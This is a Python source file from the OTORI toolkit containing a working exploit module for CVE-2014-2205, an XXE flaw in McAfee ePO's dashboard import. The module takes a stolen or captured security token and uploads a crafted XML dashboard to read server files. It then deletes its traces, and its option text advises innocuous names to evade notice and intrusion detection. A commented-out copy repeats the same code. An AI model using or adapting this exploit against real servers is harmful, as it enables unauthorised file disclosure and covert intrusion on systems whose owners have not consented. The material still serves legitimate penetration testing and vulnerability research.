#!/usr/bin/python

# On The Outside, Reaching In ("OTORI")
# Copyright 2014 Ben Lincoln
# http://www.beneaththewaves.net/
#

# This file is part of On The Outside, Reaching In ("OTORI").

# On The Outside, Reaching In ("OTORI") is free software: you can redistribute it and/or modify
# it under the terms of version 3 of the GNU General Public License as published by
# the Free Software Foundation.

# On The Outside, Reaching In ("OTORI") is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with On The Outside, Reaching In ("OTORI") (in the file LICENSE.txt).  
# If not, see <http://www.gnu.org/licenses/>.

import base64
import httplib
import inspect
import json
import os
import random
import re
import sys
import urllib

import libdeceitfulhttp
import liboutput
import libxxeexploits


# parent class for all modules related to CVE-2014-2205 - McAfee ePO 4.6 Dashboard Import
# is not actually instantiated on its own
class XXEMcAfeeEPOCVE20142205(libxxeexploits.XXEHTTP):
	def __init__(self, uid, name):
		libxxeexploits.XXEHTTP.__init__(self, uid, name)
		self.SupportsDirectoryListings = True
		# numeric portion of delimiter for multi-part upload
		self.MultiPartDelimiter = liboutput.OutputUtils.GenerateRandomNumericChars(28)
		# filename
		self.UploadedFilename = '{0}.xml'.format(self.XMLTagFactory.GetNextUnusedTag())
		
	def GetEPOObjectIDFromURL(self, url):
		self.LogDebug('Obtaining ID from the URL "{0}"'.format(url))
		rx = re.compile(".*[^a-zA-Z0-9]{1}id=(?P<objectid>[0-9]{1,24})($|[^0-9].*)", flags=re.IGNORECASE|re.MULTILINE|re.DOTALL)
		m = rx.match(url)
		if not (m):
			self.LogError('Unable to find an ID value in the URL "{0}"'.format(url))
			return None
		if not (m.group('objectid')):
			self.LogError('Unable to find an ID value in the URL "{0}" - no named group found'.format(url))
			return None
		return m.group('objectid')

# CVE-2014-2205 - McAfee ePO 4.6 Dashboard Import - Description
class XXEMcAfeeEPOCVE20142205D(XXEMcAfeeEPOCVE20142205):
	def __init__(self):
		uid = "CVE-2014-2205-D"
		name = "McAfee ePO (< 4.6 with Hotfix 940148) - CVE-2014-2205 - Dashboard Import - Description"
		XXEMcAfeeEPOCVE20142205.__init__(self, uid, name)
		self.AddNextOption('EPOBaseURL', 'McAfee ePO Base URL (e.g. https://targetserver:8443/)', None, True)
		self.AddNextOption('SecurityToken', 'The ePO security token to send with requests (can be captured using e.g. OWASP ZAP/Burp Suite, or view source on a page and look for a hidden form input named "orion.user.security.token")', None, True)
		self.AddNextOption('DashboardName', 'Name to use for the dashboard - will appear in drop-downs in the administrative web interface while the operation is occurring - pick something innocuous', 'Compliance Dashboard', False)
		self.AddNextOption('QueryName', 'Name to use for the query - probably will never be visible, but might be picked up by an IDS if you name it something distinctive', 'McAfee Agent Compliance Summary', False)
		self.AddNextOption('ConfigImportDashboardURIStem', 'URI stem for the configImportDashboard function', 'console/configImportDashboard.do', False)
		self.AddNextOption('CreateDashboardContainerURIStem', 'URI stem for the configImportDashboard function', 'console/createDashboardContainer.do', False)
		self.AddNextOption('UploadDashboardURIStem', 'URI stem for the configImportDashboard function', 'console/uploadDashboard.do', False)
		self.AddNextOption('ImportDashboardURIStem', 'URI stem for the configImportDashboard function', 'console/importDashboard.do', False)
		self.AddNextOption('ViewDashboardURIStem', 'URI stem for the configImportDashboard function', 'console/orionDashboard.do', False)
		self.AddNextOption('DeleteDashboardURIStem', 'URI stem for the configImportDashboard function', 'console/deleteDashboard.do', False)

	def SetOptionsFromCommandLineArgs(self, args):
		self.SetRequiredParameter(args, 'EPOBaseURL', 0)
		self.SetRequiredParameter(args, 'SecurityToken', 1)
		self.SetOptionalParameter(args, 'DashboardName', 2)
		self.SetOptionalParameter(args, 'QueryName', 3)
		self.SetOptionalParameter(args, 'ConfigImportDashboardURIStem', 4)
		self.SetOptionalParameter(args, 'CreateDashboardContainerURIStem', 5)
		self.SetOptionalParameter(args, 'UploadDashboardURIStem', 6)
		self.SetOptionalParameter(args, 'ImportDashboardURIStem', 7)
		self.SetOptionalParameter(args, 'ViewDashboardURIStem', 8)
		self.SetOptionalParameter(args, 'DeleteDashboardURIStem', 9)
		
	# pretty straightforward - upload a crafted XML file that defines a faux-dashboard whose description contains the XXE content
	# the only surprise was that ePO on Windows INSISTS on having Windows-style newlines sent
	# that's why the xxe.txt file for this module is in "DOS" format
	def SendXXEMessage(self, messageVariables, isSystemEntity):
		epoConfigImportDashboardURL = '{0}{1}'.format(self.GetOptionByName('EPOBaseURL').CurrentValue, self.GetOptionByName('ConfigImportDashboardURIStem').CurrentValue)
		epoCreateDashboardContainer = '{0}{1}'.format(self.GetOptionByName('EPOBaseURL').CurrentValue, self.GetOptionByName('CreateDashboardContainerURIStem').CurrentValue)
		epoUploadDashboardURL = '{0}{1}'.format(self.GetOptionByName('EPOBaseURL').CurrentValue, self.GetOptionByName('UploadDashboardURIStem').CurrentValue)
		epoImportDashboardURL = '{0}{1}'.format(self.GetOptionByName('EPOBaseURL').CurrentValue, self.GetOptionByName('ImportDashboardURIStem').CurrentValue)
		epoViewDashboardURL = '{0}{1}'.format(self.GetOptionByName('EPOBaseURL').CurrentValue, self.GetOptionByName('ViewDashboardURIStem').CurrentValue)
		epoDeleteDashboardURL = '{0}{1}'.format(self.GetOptionByName('EPOBaseURL').CurrentValue, self.GetOptionByName('DeleteDashboardURIStem').CurrentValue)
		
		# this needs to be regenerated with every request because ePO likes to return the 
		# last successful dashboard in the event of a failure, and if it contains the delimiters for the current request
		# obviously that will cause some messed-up false positives.
		messageVariables['%DELIMITER%'] = self.XMLTagFactory.GetNextUnusedTag()
		
		xxexmlmessage = self.GetModuleDataFile('xxe.txt')
		# override the default %DOCTYPE% to match the actual XML being uploaded
		messageVariables['%DOCTYPE%'] = 'dashboard'
		# override the default %ELEMENT% value with a fixed name of 'description', because that's what the current template is configured for
		messageVariables['%ELEMENT%'] = 'description'
		messageVariables['%MULTIPARTDELIMITER%'] = self.MultiPartDelimiter
		messageVariables['%SECURITYTOKEN%'] = self.GetOptionByName('SecurityToken').CurrentValue
		messageVariables['%UPLOADEDFILENAME%'] = self.UploadedFilename
		messageVariables['%DASHBOARDNAME%'] = self.GetOptionByName('DashboardName').CurrentValue
		messageVariables['%QUERYNAME%'] = self.GetOptionByName('QueryName').CurrentValue
		messageVariables['%MONITORURL%'] = '/{0}'.format(self.GetOptionByName('CreateDashboardContainerURIStem').CurrentValue)

		httpHeaders = self.GetStandardHTTPHeaders()
		# these headers seem to cause problems with the ePO webserver
		del httpHeaders['Pragma']
		del httpHeaders['Cache-Control']

		# initialize the dashboard import process
		# yes, this is really necessary
		# ePO is keeping track of this on the back-end
		initURL = '{0}?orion.user.security.token={1}'.format(epoConfigImportDashboardURL, self.GetOptionByName('SecurityToken').CurrentValue)
		response0 = self.SendRequest("GET", initURL, '', httpHeaders)
		if (response0.ResponseCode != 200):
			self.LogWarning('Received an HTTP {0} response from the server instead of HTTP 200 when initializing the upload - the upload will most likely fail'.format(response0.ResponseCode))		

		xxexmlmessage = self.ActualizeTemplate(xxexmlmessage, messageVariables)
		self.LogDebug('xxexmlmessage begin')
		self.LogDebug(xxexmlmessage)
		self.LogDebug('xxexmlmessage end')
		
		httpHeaders['Accept'] = 'text/html,application/xhtml+xml,application/xml'
		httpHeaders['Content-Type'] = 'multipart/form-data; boundary=---------------------------{0}'.format(self.MultiPartDelimiter)
		httpHeaders['Referer'] = initURL
		
		# upload the file
		response1 = self.SendRequest("POST", epoUploadDashboardURL, xxexmlmessage, httpHeaders)
		
		# pretend to follow through on going to the confirmation page
		response1RedirectURL = epoUploadDashboardURL
		if (response1.ResponseCode == 302):
			response1RedirectURL = self.GetRedirectLocationFrom30X(response1)
			self.LogDebug('Following redirect to {0}'.format(response1RedirectURL))
			httpHeaders['Referer'] = epoUploadDashboardURL
			response2 = self.SendRequest("GET", response1RedirectURL, '', httpHeaders)
			self.LogDebug('Got HTTP {0} response from redirect'.format(response2.ResponseCode))
		else:
			self.LogWarning('Received an HTTP {0} response from the server instead of HTTP 302 - the upload most likely failed.'.format(response1.ResponseCode))
		
		del httpHeaders['Content-Type']
		
		# confirm the upload
		confirmURL = '{0}?orion.user.security.token={1}'.format(epoImportDashboardURL, self.GetOptionByName('SecurityToken').CurrentValue)
		httpHeaders['Referer'] = response1RedirectURL
		response2 = self.SendRequest("GET", confirmURL, '', httpHeaders)
		uploadedDashboardURL = ''
		if (response2.ResponseCode != 302):
			self.LogError('Received an HTTP {0} response from the server instead of HTTP 302 when finalizing the import - this operation will be treated as a failure'.format(response2.ResponseCode))
			#result = self.ParseDelimitedResponse(messageVariables, response2, libxxeexploits.ResponseParserSettingsJava())
			#return result
		
		# this should be a matter of:
		# 	follow the redirect and read the uploaded dashboard
		# but thanks to either McAfee or the Python httplib quirks, the 302 redirect that comes back is missing the port number! >=|
		response2RedirectURL = self.GetRedirectLocationFrom30X(response2)
		dashboardID = self.GetEPOObjectIDFromURL(response2RedirectURL)
		dashboardViewURL = ''
		if (dashboardID):
			self.LogDebug('Found dashboard ID "{0}" in the URL "{1}"'.format(dashboardID, response2RedirectURL))
			dashboardViewURL = "{0}?id=0&orion.user.security.token={1}".format(epoViewDashboardURL, self.GetOptionByName('SecurityToken').CurrentValue)
			self.LogDebug('Will use hack/workaround of URL "{1}"'.format(dashboardID, dashboardViewURL))
		else:
			self.LogError('No dashboard ID found in the URL {0} - the upload almost certainly failed'.format(response2RedirectURL))
			# I guess there's a tiny chance this will work
			dashboardViewURL = response2RedirectURL
			dashboardID = -1
		result = None
		
		self.LogDebug('Viewing dashboard using URL "{0}"'.format(dashboardViewURL))
		httpHeaders['Referer'] = confirmURL
		response3 = self.SendRequest("GET", dashboardViewURL, '', httpHeaders)
		if (response3.ResponseCode == 200):
			self.LogDebug('Got HTTP {0} response from dashboard-viewing request - assuming success'.format(response3.ResponseCode))
		else:
			self.LogWarning('Received an HTTP {0} response from the server instead of HTTP 200 - the upload most likely failed.'.format(response3.ResponseCode))
			
		result = self.ParseDelimitedResponse(messageVariables, response3, libxxeexploits.ResponseParserSettingsJava())
		result = self.UnescapeBackslashResponse(result)

		# delete the uploaded dashboard
		deletedDoc = False
		if not (dashboardID):
			self.LogWarning('No dashboard ID was received, so no attempt will be made to delete the uploaded content')
		else:
			httpHeaders['Referer'] = response2RedirectURL
			httpHeaders['Content-Type'] = 'application/x-www-form-urlencoded'
			postBody = 'id={0}&orion.user.security.token={1}'.format(dashboardID, self.GetOptionByName('SecurityToken').CurrentValue)
			response4 = self.SendRequest("POST", epoDeleteDashboardURL, postBody, httpHeaders)
			checkResult = self.ParseDelimitedResponse(messageVariables, response4, libxxeexploits.ResponseParserSettingsJava())
			if (result.ResponseBody == checkResult.ResponseBody):
				self.LogWarning('The dashboard uploaded to ePO used to perform the XXE attack (ID "{0}") may not have been successfully deleted after use - a query for its ID returned a result that matched the value that should have been deleted'.format(dashboardID))
			else:
				deletedDoc = True
		return result
		

# this one is even more limited than the other one and has no advantages
## CVE-2014-2205 - McAfee ePO 4.6 Dashboard Import - Name
#class XXEMcAfeeEPOCVE20142205N(XXEMcAfeeEPOCVE20142205):
	#def __init__(self):
		#uid = "CVE-2014-2205-N"
		#name = "McAfee ePO (< 4.6 with Hotfix 940148) - CVE-2014-2205 - Dashboard Import - Name"
		#XXEMcAfeeEPOCVE20142205.__init__(self, uid, name)
		#self.AddNextOption('EPOBaseURL', 'McAfee ePO Base URL (e.g. https://targetserver:8443/)', None, True)
		#self.AddNextOption('SecurityToken', 'The ePO security token to send with requests (can be captured using e.g. OWASP ZAP/Burp Suite, or view source on a page and look for a hidden form input named "orion.user.security.token")', None, True)
		#self.AddNextOption('DashboardName', 'Name to use for the dashboard - will appear in drop-downs in the administrative web interface while the operation is occurring - pick something innocuous', 'Compliance Dashboard', False)
		#self.AddNextOption('QueryName', 'Name to use for the query - probably will never be visible, but might be picked up by an IDS if you name it something distinctive', 'McAfee Agent Compliance Summary', False)
		#self.AddNextOption('ConfigImportDashboardURIStem', 'URI stem for the configImportDashboard function', 'console/configImportDashboard.do', False)
		#self.AddNextOption('CreateDashboardContainerURIStem', 'URI stem for the configImportDashboard function', 'console/createDashboardContainer.do', False)
		#self.AddNextOption('UploadDashboardURIStem', 'URI stem for the configImportDashboard function', 'console/uploadDashboard.do', False)
		#self.AddNextOption('ImportDashboardURIStem', 'URI stem for the configImportDashboard function', 'console/importDashboard.do', False)
		#self.AddNextOption('ViewDashboardURIStem', 'URI stem for the configImportDashboard function', 'console/orionDashboard.do', False)
		#self.AddNextOption('DeleteDashboardURIStem', 'URI stem for the configImportDashboard function', 'console/deleteDashboard.do', False)

	#def SetOptionsFromCommandLineArgs(self, args):
		#self.SetRequiredParameter(args, 'EPOBaseURL', 0)
		#self.SetRequiredParameter(args, 'SecurityToken', 1)
		#self.SetOptionalParameter(args, 'DashboardName', 2)
		#self.SetOptionalParameter(args, 'QueryName', 3)
		#self.SetOptionalParameter(args, 'ConfigImportDashboardURIStem', 4)
		#self.SetOptionalParameter(args, 'CreateDashboardContainerURIStem', 5)
		#self.SetOptionalParameter(args, 'UploadDashboardURIStem', 6)
		#self.SetOptionalParameter(args, 'ImportDashboardURIStem', 7)
		#self.SetOptionalParameter(args, 'ViewDashboardURIStem', 8)
		#self.SetOptionalParameter(args, 'DeleteDashboardURIStem', 9)
		
	## pretty straightforward - upload a crafted XML file that defines a faux-dashboard whose description contains the XXE content
	## the only surprise was that ePO on Windows INSISTS on having Windows-style newlines sent
	## that's why the xxe.txt file for this module is in "DOS" format
	#def SendXXEMessage(self, messageVariables, isSystemEntity):
		#epoConfigImportDashboardURL = '{0}{1}'.format(self.GetOptionByName('EPOBaseURL').CurrentValue, self.GetOptionByName('ConfigImportDashboardURIStem').CurrentValue)
		#epoCreateDashboardContainer = '{0}{1}'.format(self.GetOptionByName('EPOBaseURL').CurrentValue, self.GetOptionByName('CreateDashboardContainerURIStem').CurrentValue)
		#epoUploadDashboardURL = '{0}{1}'.format(self.GetOptionByName('EPOBaseURL').CurrentValue, self.GetOptionByName('UploadDashboardURIStem').CurrentValue)
		#epoImportDashboardURL = '{0}{1}'.format(self.GetOptionByName('EPOBaseURL').CurrentValue, self.GetOptionByName('ImportDashboardURIStem').CurrentValue)
		#epoViewDashboardURL = '{0}{1}'.format(self.GetOptionByName('EPOBaseURL').CurrentValue, self.GetOptionByName('ViewDashboardURIStem').CurrentValue)
		#epoDeleteDashboardURL = '{0}{1}'.format(self.GetOptionByName('EPOBaseURL').CurrentValue, self.GetOptionByName('DeleteDashboardURIStem').CurrentValue)
		
		## this needs to be regenerated with every request because ePO likes to return the 
		## last successful dashboard in the event of a failure, and if it contains the delimiters for the current request
		## obviously that will cause some messed-up false positives.
		#messageVariables['%DELIMITER%'] = self.XMLTagFactory.GetNextUnusedTag()
		
		#xxexmlmessage = self.GetModuleDataFile('xxe.txt')
		## override the default %DOCTYPE% to match the actual XML being uploaded
		#messageVariables['%DOCTYPE%'] = 'dashboard'
		## override the default %ELEMENT% value with a fixed name of 'description', because that's what the current template is configured for
		#messageVariables['%ELEMENT%'] = 'description'
		#messageVariables['%MULTIPARTDELIMITER%'] = self.MultiPartDelimiter
		#messageVariables['%SECURITYTOKEN%'] = self.GetOptionByName('SecurityToken').CurrentValue
		#messageVariables['%UPLOADEDFILENAME%'] = self.UploadedFilename
		#messageVariables['%DASHBOARDNAME%'] = self.GetOptionByName('DashboardName').CurrentValue
		#messageVariables['%QUERYNAME%'] = self.GetOptionByName('QueryName').CurrentValue
		#messageVariables['%MONITORURL%'] = '/{0}'.format(self.GetOptionByName('CreateDashboardContainerURIStem').CurrentValue)

		#httpHeaders = self.GetStandardHTTPHeaders()
		## these headers seem to cause problems with the ePO webserver
		#del httpHeaders['Pragma']
		#del httpHeaders['Cache-Control']

		## initialize the dashboard import process
		## yes, this is really necessary
		## ePO is keeping track of this on the back-end
		#initURL = '{0}?orion.user.security.token={1}'.format(epoConfigImportDashboardURL, self.GetOptionByName('SecurityToken').CurrentValue)
		#response0 = self.SendRequest("GET", initURL, '', httpHeaders)
		#if (response0.ResponseCode != 200):
			#self.LogWarning('Received an HTTP {0} response from the server instead of HTTP 200 when initializing the upload - the upload will most likely fail'.format(response0.ResponseCode))		

		#xxexmlmessage = self.ActualizeTemplate(xxexmlmessage, messageVariables)
		#self.LogDebug('xxexmlmessage begin')
		#self.LogDebug(xxexmlmessage)
		#self.LogDebug('xxexmlmessage end')
		
		#httpHeaders['Accept'] = 'text/html,application/xhtml+xml,application/xml'
		#httpHeaders['Content-Type'] = 'multipart/form-data; boundary=---------------------------{0}'.format(self.MultiPartDelimiter)
		#httpHeaders['Referer'] = initURL
		
		## upload the file
		#response1 = self.SendRequest("POST", epoUploadDashboardURL, xxexmlmessage, httpHeaders)
		
		## pretend to follow through on going to the confirmation page
		#response1RedirectURL = epoUploadDashboardURL
		#if (response1.ResponseCode == 302):
			#response1RedirectURL = self.GetRedirectLocationFrom30X(response1)
			#self.LogDebug('Following redirect to {0}'.format(response1RedirectURL))
			#httpHeaders['Referer'] = epoUploadDashboardURL
			#response2 = self.SendRequest("GET", response1RedirectURL, '', httpHeaders)
			#self.LogDebug('Got HTTP {0} response from redirect'.format(response2.ResponseCode))
		#else:
			#self.LogWarning('Received an HTTP {0} response from the server instead of HTTP 302 - the upload most likely failed.'.format(response1.ResponseCode))
		
		#del httpHeaders['Content-Type']
		
		## confirm the upload
		#confirmURL = '{0}?orion.user.security.token={1}'.format(epoImportDashboardURL, self.GetOptionByName('SecurityToken').CurrentValue)
		#httpHeaders['Referer'] = response1RedirectURL
		#response2 = self.SendRequest("GET", confirmURL, '', httpHeaders)
		#uploadedDashboardURL = ''
		#if (response2.ResponseCode != 302):
			#self.LogError('Received an HTTP {0} response from the server instead of HTTP 302 when finalizing the import - this operation will be treated as a failure'.format(response2.ResponseCode))
			##result = self.ParseDelimitedResponse(messageVariables, response2, libxxeexploits.ResponseParserSettingsJava())
			##return result
		
		## this should be a matter of:
		## 	follow the redirect and read the uploaded dashboard
		## but thanks to either McAfee or the Python httplib quirks, the 302 redirect that comes back is missing the port number! >=|
		#response2RedirectURL = self.GetRedirectLocationFrom30X(response2)
		#dashboardID = self.GetEPOObjectIDFromURL(response2RedirectURL)
		#dashboardViewURL = ''
		#if (dashboardID):
			#self.LogDebug('Found dashboard ID "{0}" in the URL "{1}"'.format(dashboardID, response2RedirectURL))
			#dashboardViewURL = "{0}?id=0&orion.user.security.token={1}".format(epoViewDashboardURL, self.GetOptionByName('SecurityToken').CurrentValue)
			#self.LogDebug('Will use hack/workaround of URL "{1}"'.format(dashboardID, dashboardViewURL))
		#else:
			#self.LogError('No dashboard ID found in the URL {0} - the upload almost certainly failed'.format(response2RedirectURL))
			## I guess there's a tiny chance this will work
			#dashboardViewURL = response2RedirectURL
			#dashboardID = -1
		#result = None
		
		#self.LogDebug('Viewing dashboard using URL "{0}"'.format(dashboardViewURL))
		#httpHeaders['Referer'] = confirmURL
		#response3 = self.SendRequest("GET", dashboardViewURL, '', httpHeaders)
		#if (response3.ResponseCode == 200):
			#self.LogDebug('Got HTTP {0} response from dashboard-viewing request - assuming success'.format(response3.ResponseCode))
		#else:
			#self.LogWarning('Received an HTTP {0} response from the server instead of HTTP 200 - the upload most likely failed.'.format(response3.ResponseCode))
			
		#result = self.ParseDelimitedResponse(messageVariables, response3, libxxeexploits.ResponseParserSettingsJava())
		#result = self.UnescapeBackslashResponse(result)

		## delete the uploaded dashboard
		#deletedDoc = False
		#if not (dashboardID):
			#self.LogWarning('No dashboard ID was received, so no attempt will be made to delete the uploaded content')
		#else:
			#httpHeaders['Referer'] = response2RedirectURL
			#httpHeaders['Content-Type'] = 'application/x-www-form-urlencoded'
			#postBody = 'id={0}&orion.user.security.token={1}'.format(dashboardID, self.GetOptionByName('SecurityToken').CurrentValue)
			#response4 = self.SendRequest("POST", epoDeleteDashboardURL, postBody, httpHeaders)
			#checkResult = self.ParseDelimitedResponse(messageVariables, response4, libxxeexploits.ResponseParserSettingsJava())
			#if (result.ResponseBody == checkResult.ResponseBody):
				#self.LogWarning('The dashboard uploaded to ePO used to perform the XXE attack (ID "{0}") may not have been successfully deleted after use - a query for its ID returned a result that matched the value that should have been deleted'.format(dashboardID))
			#else:
				#deletedDoc = True
		#return result
		